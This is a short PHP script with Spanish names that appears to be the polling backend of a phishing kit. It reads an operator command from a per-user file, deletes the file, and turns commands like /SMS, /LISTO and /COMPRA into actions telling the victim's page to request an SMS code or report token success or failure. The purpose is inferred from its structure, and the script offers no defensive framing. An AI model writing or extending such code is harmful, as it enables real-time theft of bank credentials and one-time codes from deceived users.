<?php
session_start();
header('Content-Type: application/json');

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { echo '{"action":"wait"}'; exit; }

$archivo = "acciones/$usuario.txt";
if (!file_exists($archivo)) { echo '{"action":"wait"}'; exit; }

$accion = trim(file_get_contents($archivo));
@unlink($archivo);

$map = [
    '/ERROR'  => 'ERROR',
    '/SMS'    => 'SMS',
    '/LISTO'  => 'TOKOK',
    '/COMPRA' => 'TOKERR',
];
echo json_encode(['action' => $map[$accion] ?? 'wait']);
